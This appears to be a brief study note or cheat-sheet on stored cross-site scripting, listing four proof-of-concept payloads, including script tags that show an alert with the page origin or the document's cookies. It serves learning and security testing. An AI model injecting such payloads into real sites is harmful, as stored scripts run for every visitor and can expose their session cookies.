#### Stored XSS (Persistent XSS)

May affect any user that visits the page since it's stored in back-end database

Payloads:
- <script>alert(window.origin)</script>
- `<plaintext>`
- <script>print()</script>
- <script>alert(document.cookie)</script>

